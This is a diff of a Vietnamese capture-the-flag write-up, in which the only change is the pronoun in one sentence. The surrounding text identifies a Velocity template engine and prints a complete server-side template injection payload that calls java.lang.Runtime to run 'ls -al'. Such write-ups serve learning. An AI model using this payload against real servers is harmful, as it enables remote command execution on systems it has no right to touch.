@@ -16,7 +16,7 @@ Sau đó, mình thử bấm enter để search thì nó xuất hiện một dòn
 
 ![image](https://github.com/anhshidou/FUSec2024/assets/120787381/11dfde2e-afea-4c66-affd-3c9645ad6e09)
 
-Sau khi qua tìm hiểu, em thấy rằng velocity là 1 Java-based Template. Vì thế nên, có thể sẽ có đoạn payload nào đó để inject vào trong cái bài này. Em google thử velocity payload shell script thì ra được đoạn payload là:
+Sau khi qua tìm hiểu, mình thấy rằng velocity là 1 Java-based Template. Vì thế nên, có thể sẽ có đoạn payload nào đó để inject vào trong cái bài này. Em google thử velocity payload shell script thì ra được đoạn payload là:
 
 ``` #set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output ```
 
